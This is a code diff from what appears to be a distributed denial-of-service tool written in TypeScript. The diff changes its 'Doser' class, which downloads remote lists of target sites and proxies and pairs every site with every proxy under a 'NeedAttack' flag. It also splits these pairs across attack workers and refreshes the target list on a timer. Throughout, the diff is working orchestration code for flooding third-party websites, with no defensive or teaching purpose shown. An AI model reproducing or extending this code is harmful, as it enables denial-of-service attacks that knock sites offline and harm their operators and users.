@@ -1,6 +1,6 @@
 import { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
-import { DoserEventType, TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse } from './types'
+import { DoserEventType, TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse, TargetDataAlternative } from './types'
 import { Runner } from './runner'
 import { getSites, getProxies } from './requests'
 
@@ -17,11 +17,12 @@ export class Doser {
     updateTime: Date;
     sites: SiteData[];
     proxies: ProxyData[];
+    targets: TargetDataAlternative[];
   } | null = null
 
   private verboseError: boolean;
 
-  constructor (onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
+  constructor(onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
     this.onlyProxy = onlyProxy
     this.working = false
     this.eventSource = new EventEmitter()
@@ -31,7 +32,7 @@ export class Doser {
     })
   }
 
-  private logError (message:string, cause: unknown) {
+  private logError(message: string, cause: unknown) {
     console.log(message)
 
     if (this.verboseError) {
@@ -41,19 +42,21 @@ export class Doser {
     }
   }
 
-  private async initialize (numberOfWorkers: number, attemptNumber = 1): Promise<void> {
+  private async initialize(numberOfWorkers: number, attemptNumber = 1): Promise<void> {
     const config = await this.getSitesAndProxies()
+    const targets: TargetDataAlternative[] = []
     if (!config) {
       console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
       return this.initialize(numberOfWorkers, attemptNumber + 1)
     }
     console.debug('Initialized doser', config)
-    this.updateConfiguration(config)
+    this.makeTargets(config, targets)
+    this.updateConfiguration(config, targets)
     this.listenForConfigurationUpdates()
     return this.setWorkersCount(numberOfWorkers)
   }
 
-  forceProxy (newVal: boolean) {
+  forceProxy(newVal: boolean) {
     this.onlyProxy = newVal
     try {
       this.workers.forEach((worker, i) => {
@@ -61,27 +64,43 @@ export class Doser {
         console.debug(`Changing runner proxy value ${i}..`)
       })
 
-    } catch(err) {
+    } catch (err) {
       console.log(err)
     }
   }
 
-  async loadHostsFile () {
+  async loadHostsFile() {
     // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
     // this.hosts = response.data as Array<string>
   }
 
-  private updateConfiguration (configuration: { sites: SiteData[]; proxies: ProxyData[] }) {
+
+  private makeTargets(configuration: { sites: SiteData[]; proxies: ProxyData[] }, targets: TargetDataAlternative[]) {
+    let targetsLocal: TargetDataAlternative[] = []
+    for (let i = 0; i < configuration.sites.length; i++) {
+      for (let j = 0; j < configuration.proxies.length; j++) {
+        var newTarget = {
+          site: configuration.sites[i],
+          proxy: configuration.proxies[j],
+          NeedAttack: true
+        } as TargetDataAlternative
+        targets.push(newTarget);
+      }
+    }
+  }
+
+  private updateConfiguration(configuration: { sites: SiteData[]; proxies: ProxyData[] }, targets: TargetDataAlternative[]) {
     this.ddosConfiguration = {
       ...configuration,
-      updateTime: new Date()
+      updateTime: new Date(),
+      targets: targets
     }
     this.workers.forEach(worker => {
-      worker.updateConfiguration(configuration)
+      worker.updateConfiguration(targets)
     })
   }
 
-  private listenForConfigurationUpdates (wasPreviousUpdateSuccessful = true) {
+  private listenForConfigurationUpdates(wasPreviousUpdateSuccessful = true) {
     // eslint-disable-next-line @typescript-eslint/no-misused-promises
     setTimeout(async () => {
       if (!this.ddosConfiguration) {
@@ -89,22 +108,23 @@ export class Doser {
       }
 
       const config = await this.getSitesAndProxies()
+      const targets: TargetDataAlternative[] = []
       if (!config) {
         console.debug('Wasnt able to get configuration updates')
         return this.listenForConfigurationUpdates(false)
       }
-      this.updateConfiguration(config)
+      this.makeTargets(config, targets)
+      this.updateConfiguration(config, targets)
       this.listenForConfigurationUpdates(true)
     }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
   }
 
-  async getSitesAndProxies (): Promise<GetSitesAndProxiesResponse> {
+  async getSitesAndProxies(): Promise<GetSitesAndProxiesResponse> {
     while (this.working) { // escaping unavailable hosts
       try {
         const [proxies, sites] = await Promise.all([getProxies(), getSites()])
 
         if (proxies.status !== 200 || sites.status !== 200) continue
-
         return {
           sites: sites.data,
           proxies: proxies.data
@@ -116,7 +136,7 @@ export class Doser {
     return null
   }
 
-  async getRandomTarget (): Promise<TargetData | null> {
+  async getRandomTarget(): Promise<TargetData | null> {
     while (this.working) { // escaping unavailable hosts
       try {
         const [proxies, sites] = await Promise.all([getProxies(), getSites()])
@@ -134,22 +154,54 @@ export class Doser {
     return null
   }
 
-  setWorkersCount (newCount: number) {
-    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
-    if (newCount < this.numberOfWorkers) {
-      for (let i = this.numberOfWorkers; i >= newCount; i--) {
-        this.workers[i]?.eventSource.removeAllListeners()
-        this.workers[i]?.stop()
+  setWorkersCount(newCount: number) {
+    /*if (this.ddosConfiguration != null) {
+      let size = Math.floor(this.ddosConfiguration.targets.length / newCount)
+      console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
+      if (newCount < this.numberOfWorkers) {
+        for (let i = this.numberOfWorkers; i >= newCount; i--) {
+          this.workers[i]?.eventSource.removeAllListeners()
+          this.workers[i]?.stop()
+        }
+        this.workers = this.workers.slice(0, newCount)
+      } else {
+        while (this.workers.length < newCount) {
+          const newWorker = this.createNewWorker(0, this.ddosConfiguration.targets.length)
+          this.workers.push(newWorker)
+          if (this.working) {
+            newWorker.start().catch(error => {
+              console.debug('Wasnt able to start new runner:', error)
+            })
+          }
+        }
       }
-      this.workers = this.workers.slice(0, newCount)
-    } else {
-      while (this.workers.length < newCount) {
-        const newWorker = this.createNewWorker()
-        this.workers.push(newWorker)
-        if (this.working) {
-          newWorker.start().catch(error => {
-            console.debug('Wasnt able to start new runner:', error)
-          })
+    }*/
+    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
+    if (newCount != this.workers.length) {
+      this.workers.forEach(element => {
+        element?.eventSource.removeAllListeners()
+        element?.stop()
+      });
+      if (this.ddosConfiguration != null) {
+        let size = Math.floor(this.ddosConfiguration.targets.length / newCount)
+        for (let i = 0; i < newCount; i++) {
+          if (i < newCount - 1) {
+            const newWorker = this.createNewWorker(i*size,(i+1)*size)
+            this.workers.push(newWorker)
+            if (this.working) {
+              newWorker.start().catch(error => {
+                console.debug('Wasnt able to start new runner:', error)
+              })
+            }
+          }else{
+            const newWorker = this.createNewWorker(i*size,this.ddosConfiguration.targets.length)
+            this.workers.push(newWorker)
+            if (this.working) {
+              newWorker.start().catch(error => {
+                console.debug('Wasnt able to start new runner:', error)
+              })
+            }
+          }
         }
       }
     }
@@ -157,7 +209,7 @@ export class Doser {
     this.numberOfWorkers = newCount
   }
 
-  start () {
+  start() {
     this.working = true
     this.workers.forEach((worker, i) => {
       console.debug(`Starting runner ${i}..`)
@@ -167,7 +219,7 @@ export class Doser {
     })
   }
 
-  stop () {
+  stop() {
     this.working = false
     this.workers.forEach((worker, i) => {
       console.debug(`Stopping runner ${i}..`)
@@ -175,16 +227,19 @@ export class Doser {
     })
   }
 
-  private createNewWorker (): Runner {
+  private createNewWorker(startID: number, endID: number): Runner {
     console.debug('Creating new worker..')
     // Should never happen
     if (!this.ddosConfiguration) {
       throw new Error('Cannot create worker without configuration')
     }
     const worker = new Runner({
-      sites: this.ddosConfiguration.sites,
-      proxies: this.ddosConfiguration.proxies,
-      onlyProxy: this.onlyProxy
+      //sites: this.ddosConfiguration.sites,
+      //proxies: this.ddosConfiguration.proxies,
+      targets: this.ddosConfiguration.targets,
+      onlyProxy: this.onlyProxy,
+      startID: startID,
+      endID: endID
     })
     worker.eventSource.on('attack', event => {
       this.eventSource.emit('atack', {
@@ -201,7 +256,7 @@ export class Doser {
     return worker
   }
 
-  listen (event: DoserEventType, callback: (data: any)=>void) {
+  listen(event: DoserEventType, callback: (data: any) => void) {
     this.eventSource.addListener(event, callback)
   }
 }
